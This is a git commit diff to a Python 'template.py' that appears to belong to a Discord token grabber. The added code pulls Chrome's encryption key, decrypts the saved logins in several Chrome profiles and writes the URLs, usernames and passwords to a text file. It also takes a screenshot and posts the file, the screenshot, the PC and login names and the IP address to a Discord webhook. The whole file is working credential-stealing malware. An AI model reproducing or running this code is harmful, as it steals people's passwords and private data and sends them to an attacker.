f892e8ccd9b16c46352c41583f7e4b5509e87d1f
Teobre <54266864+Teobre@users.noreply.github.com>
2021-01-05 12:56:08 +0100

    Update template.py

--- Files/template.py
+++ Files/template.py
@@ -3,11 +3,91 @@ import re
 import os
 import json
 import requests
+import base64
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+import sqlite3
+from dhooks import Webhook, File
+from PIL import ImageGrab
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
+temp = os.getenv('TEMP')
 
 
+
+def get_master_key(path_state):
+    with open(path_state, "r", encoding='utf-8') as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+    return master_key
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = generate_cipher(master_key, iv)
+        decrypted_pass = decrypt_payload(cipher, payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        return "Chrome < 80"
+
+paths_state = {
+    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Local State'
+}
+
+for platform_lol, path_lol in paths_state.items():
+    if not os.path.exists(path_lol):
+        continue
+    master_key = get_master_key(path_lol)
+
+paths_chrome = {
+    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Login Data',
+    'Google Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
+    'Google Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
+    'Google Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
+    'Google Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
+    'Google Chrome6': local + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
+    'Google Chrome7': local + '\\Google\\Chrome\\User Data\\Profile 6\\Login Data'
+    }
+
+for platform_lol, path_mdr in paths_chrome.items():
+    if not os.path.exists(path_mdr):
+        continue
+    shutil.copy2(path_mdr, temp + "Loginvault.db")
+    conn = sqlite3.connect(temp  + "Loginvault.db")
+    cursor = conn.cursor()
+
+
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+    file_grab = open(local + '\\Google\\Password_Chrome.txt', 'w')
+    for r in cursor.fetchall():
+        url = r[0]
+        username = r[1]
+        encrypted_password = r[2]
+        decrypted_password = decrypt_password(encrypted_password, master_key)
+        file_grab.write(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}" + "\n" + "*" * 50 + "\n")
+    file_grab.close()
+
+    cursor.close()
+    conn.close()
+    try:
+        os.remove(temp + "Loginvault.db")
+    except Exception as e:
+        pass
 
 paths = {
     'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
@@ -82,11 +162,19 @@ def grab_all(token):
             },
                     {
                 "name": "**Autres infos**",
-                "value": f"Nom du PC: {os.getenv('COMPUTERNAME')}\nIP: {ipinfo['query']}"
+                "value": f"Nom du PC: {os.getenv('COMPUTERNAME')}\nNom de session: {os.getlogin()}\nIP: {ipinfo['query']}"
             }]
         }]
     }
-    requests.post(url, json=payload)
+    requests.post(url_webhook, json=payload)
+    hook = Webhook(url_webhook)
+    screen = ImageGrab.grab()
+    screen.save(local + '\\screen.png')
+    screen.close()
+    hook.send(file=File(local + "\\screen.png"))
+    os.remove(local + '\\screen.png')
+    with open(local + '\\Google\\Password_Chrome.txt', 'r') as fp:
+        hook.send(file=File(fp, name=f"Passwords_Chrome_{tokeninfo['username']}.txt"))
 
 for platform_lol, path in paths.items():
     if not os.path.exists(path):
